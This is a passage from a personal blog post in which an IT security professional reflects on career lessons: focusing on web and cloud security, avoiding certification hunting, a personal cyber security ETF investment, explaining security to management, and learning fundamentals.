you just need to focus on one thing and be dedicated to it.That’s an easy saying but hard to do, especially if you work in IT and even more especially in the field of IT security. For me as a creative minded person, who always strives to learn something new, working in IT security is like being that little child in toy paradise. There are so many options and cool things to play with. So many things to learn and so many ways to become better. — But my time is limited and I’m not payed for playing around with all this cool stuff, so I need to focus for at least certain areas.I personally decided to focus on Web Application Security and AWS Cloud Security until the end of 2021. That’s why I’ve chosen to achieve the eLearnSecurity Web application Penetration Tester and Offensive Security Web Expert certification in 2021.One lesson along the road is to don’t get crazy about certifications. There are many companies, which business model is based on the trust in IT certifications and the belief in a growing need for cyber security experts. And I see a lot of promotional campaigns that offers big discounts for security trainings. — Don’t freak out and avoid to become a cert hunter! Spend your hard earned money, your time and health only into those trainings you realy need to become an expert in the field you have chosen.Benefit from the BoomI’ve already mentioned the growing demand for IT security experts above. And with a more and more connected world, the Internet of Everything, hacked elections , industrial spionage and events like the SolarWind hack happening, there is a big growth in this industry for years.That’s why I personally, beside other ETFs, invest monthly into L&amp;amp;G Cyber Security UCITS ETF.It has a growth rate of 118% during the last 5 years, almost 33% during the last 12 months and is a good chance to participate in the cyber security boom.Difference between Hackers and ManagersThere is a big difference between the management perspective on IT security and the Hackers perspective on it. If you want to get paid for doing things you love and if you want to be successful, you need to learn to switch between both perspectives.The ability to communicate the things you know to different audiences and to explain more sophisticated topics in simple words and especially to point out why they are important for the management and their organization is crucial for you to succeed in your job to secure the systems.Yes there is not much glory in prevention. But there is absolute none glory for not being able to get the resources which you need, to secure the company that pays your salary.Some general Learnings Don’t get obsessed by tools, learn fundamentals instead. Threat Modeling is a great exercise for all kind of IT teams. Teaching the stuff, you’ve learned is a great way to become better. You don’t need to know everything. That’s totally okay and the ability to admit a lack of knowledge, is a strength. That is far better than pretending to know everything and to lose the trust of others at the end. There are so many good books out there you can learn from. These are my favourites: The Ultimate CyberSecurity Reading List for 2021I hope this article was helpful and you could learn something from my experiences." } ]
